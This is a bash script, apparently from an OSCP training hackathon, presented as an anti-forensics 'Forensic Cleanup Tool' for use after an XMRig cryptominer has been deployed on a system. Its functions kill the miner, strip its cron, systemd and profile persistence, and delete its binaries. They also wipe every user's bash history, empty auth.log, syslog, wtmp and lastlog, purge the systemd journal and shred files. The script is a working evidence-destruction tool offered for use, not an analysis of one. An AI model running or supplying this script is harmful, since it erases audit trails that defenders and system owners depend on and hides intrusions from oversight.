#!/bin/bash
################################################################################
# Forensic Cleanup Script
# Purpose: Remove traces of deployment (Anti-Forensics)
# Author: OSCP Hackathon 2025
# WARNING: Use only in authorized testing environments
################################################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log_info() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[-]${NC} $1"; }

################################################################################
# Clear Bash History
################################################################################
clear_bash_history() {
    log_info "Clearing bash history..."

    # Clear current session
    history -c

    # Clear history file
    cat /dev/null > ~/.bash_history

    # Disable history for this session
    unset HISTFILE
    export HISTFILE=/dev/null
    export HISTSIZE=0

    # Also clear for other users if root
    if [ "$EUID" -eq 0 ]; then
        for user_home in /home/*; do
            if [ -f "$user_home/.bash_history" ]; then
                cat /dev/null > "$user_home/.bash_history"
                log_info "Cleared history for: $user_home"
            fi
        done
    fi

    log_info "Bash history cleared"
}

################################################################################
# Clear Log Files
################################################################################
clear_logs() {
    log_warn "Clearing log files (requires root)..."

    if [ "$EUID" -ne 0 ]; then
        log_error "Root required for log clearing"
        return 1
    fi

    # Clear auth logs
    > /var/log/auth.log
    > /var/log/auth.log.1

    # Clear syslog
    > /var/log/syslog
    > /var/log/syslog.1

    # Clear user logs
    > /var/log/user.log

    # Clear wtmp (login records)
    > /var/log/wtmp

    # Clear lastlog
    > /var/log/lastlog

    # Clear journal if systemd
    if command -v journalctl &> /dev/null; then
        journalctl --vacuum-time=1s
    fi

    log_info "Log files cleared"
}

################################################################################
# Remove Network Artifacts
################################################################################
clear_network_artifacts() {
    log_info "Clearing network artifacts..."

    # Clear wget history
    rm -f ~/.wget-hsts 2>/dev/null

    # Clear curl cookies/cache
    rm -rf ~/.curl 2>/dev/null

    # Clear DNS cache (if systemd-resolved)
    if command -v systemd-resolve &> /dev/null; then
        systemd-resolve --flush-caches 2>/dev/null
    fi

    log_info "Network artifacts cleared"
}

################################################################################
# Remove Temporary Files
################################################################################
clear_temp_files() {
    log_info "Removing temporary files..."

    # Remove common temp locations
    rm -rf /tmp/xmrig* 2>/dev/null
    rm -rf /tmp/.download_* 2>/dev/null
    rm -rf /tmp/... 2>/dev/null
    rm -rf /var/tmp/.systemd 2>/dev/null

    # Clear user tmp
    rm -rf ~/.cache/xmrig* 2>/dev/null

    log_info "Temporary files removed"
}

################################################################################
# Remove Persistence Mechanisms
################################################################################
remove_persistence() {
    log_info "Removing persistence mechanisms..."

    # Cron jobs
    crontab -l 2>/dev/null | grep -v "xmrig\|systemd-monitor\|kworker" | crontab -

    # Systemd services
    if [ "$EUID" -eq 0 ]; then
        for service in /etc/systemd/system/*.service; do
            if grep -q "xmrig\|XMRig" "$service" 2>/dev/null; then
                systemctl stop "$(basename $service)"
                systemctl disable "$(basename $service)"
                rm "$service"
                log_info "Removed systemd service: $service"
            fi
        done
        systemctl daemon-reload
    fi

    # User systemd services
    for service in ~/.config/systemd/user/*.service; do
        if [ -f "$service" ] && grep -q "xmrig" "$service"; then
            systemctl --user stop "$(basename $service)"
            systemctl --user disable "$(basename $service)"
            rm "$service"
            log_info "Removed user service: $service"
        fi
    done
    systemctl --user daemon-reload 2>/dev/null

    # Profile files
    sed -i '/xmrig/d' ~/.bashrc 2>/dev/null
    sed -i '/xmrig/d' ~/.profile 2>/dev/null

    # XDG autostart
    rm -f ~/.config/autostart/*xmrig* 2>/dev/null

    # RC.local
    if [ "$EUID" -eq 0 ] && [ -f "/etc/rc.local" ]; then
        sed -i '/xmrig/d' /etc/rc.local
    fi

    log_info "Persistence mechanisms removed"
}

################################################################################
# Kill Running Processes
################################################################################
kill_processes() {
    log_info "Killing XMRig processes..."

    # Find and kill by name
    pkill -9 xmrig 2>/dev/null
    pkill -9 systemd-monitor 2>/dev/null
    pkill -9 kworker-update 2>/dev/null

    # Find by network connection (mining pools)
    for pid in $(lsof -i :3333 -i :4444 -i :5555 -t 2>/dev/null); do
        kill -9 $pid 2>/dev/null
        log_info "Killed process with PID: $pid"
    done

    log_info "Processes terminated"
}

################################################################################
# Remove Binaries and Configs
################################################################################
remove_binaries() {
    log_info "Removing binaries and configs..."

    # Common installation paths
    rm -rf /opt/.cache 2>/dev/null
    rm -rf /usr/local/lib/.fonts 2>/dev/null
    rm -rf /usr/local/lib/.systemd 2>/dev/null
    rm -rf /var/cache/.update 2>/dev/null

    # Find by content (strings search)
    find /tmp /var/tmp /opt -type f -executable 2>/dev/null | while read file; do
        if strings "$file" 2>/dev/null | grep -q "donate.v2.xmrig.com"; then
            rm -f "$file"
            log_info "Removed: $file"
        fi
    done

    # Config files
    find /tmp /var/tmp /opt -name "*.json" 2>/dev/null | while read config; do
        if grep -q "randomx\|huge-pages\|pool" "$config" 2>/dev/null; then
            rm -f "$config"
            log_info "Removed config: $config"
        fi
    done

    log_info "Binaries and configs removed"
}

################################################################################
# Secure File Deletion
################################################################################
secure_delete_file() {
    local file="$1"

    if [ ! -f "$file" ]; then
        return
    fi

    # Overwrite with random data multiple times
    if command -v shred &> /dev/null; then
        shred -vfz -n 3 "$file" 2>/dev/null
        log_info "Securely deleted: $file"
    else
        # Manual overwrite
        dd if=/dev/urandom of="$file" bs=1M count=1 2>/dev/null
        rm -f "$file"
        log_info "Deleted: $file"
    fi
}

################################################################################
# Complete System Cleanup
################################################################################
complete_cleanup() {
    log_warn "Performing complete system cleanup..."

    kill_processes
    remove_persistence
    remove_binaries
    clear_temp_files
    clear_network_artifacts
    clear_bash_history

    if [ "$EUID" -eq 0 ]; then
        clear_logs
    else
        log_warn "Skipping log cleanup (requires root)"
    fi

    log_info "Complete cleanup finished"
}

################################################################################
# Targeted Cleanup (Specific Path)
################################################################################
targeted_cleanup() {
    local target="$1"

    log_info "Performing targeted cleanup: $target"

    if [ -d "$target" ]; then
        # Directory - remove recursively
        rm -rf "$target"
        log_info "Removed directory: $target"
    elif [ -f "$target" ]; then
        # File - secure delete
        secure_delete_file "$target"
    else
        log_error "Target not found: $target"
    fi
}

################################################################################
# Interactive Menu
################################################################################
show_menu() {
    echo "=========================================="
    echo "  Forensic Cleanup Tool"
    echo "=========================================="
    echo ""
    echo "Select cleanup operation:"
    echo ""
    echo "  1) Kill XMRig processes"
    echo "  2) Remove persistence mechanisms"
    echo "  3) Remove binaries and configs"
    echo "  4) Clear bash history"
    echo "  5) Clear log files (root)"
    echo "  6) Clear network artifacts"
    echo "  7) Remove temporary files"
    echo "  8) COMPLETE CLEANUP (ALL)"
    echo "  9) Targeted cleanup (specify path)"
    echo "  0) Exit"
    echo ""
    read -p "Choice: " choice

    case $choice in
        1) kill_processes ;;
        2) remove_persistence ;;
        3) remove_binaries ;;
        4) clear_bash_history ;;
        5) clear_logs ;;
        6) clear_network_artifacts ;;
        7) clear_temp_files ;;
        8)
            read -p "Are you sure? This will remove ALL traces (y/N): " confirm
            if [ "$confirm" == "y" ]; then
                complete_cleanup
            else
                log_info "Cancelled"
            fi
            ;;
        9)
            read -p "Enter path to clean: " target_path
            targeted_cleanup "$target_path"
            ;;
        0) echo "Exiting..." ; exit 0 ;;
        *) echo "Invalid choice" ;;
    esac
}

################################################################################
# Main
################################################################################
main() {
    if [ "$1" == "--auto" ]; then
        complete_cleanup
    elif [ -n "$1" ]; then
        targeted_cleanup "$1"
    else
        show_menu
    fi
}

main "$@"
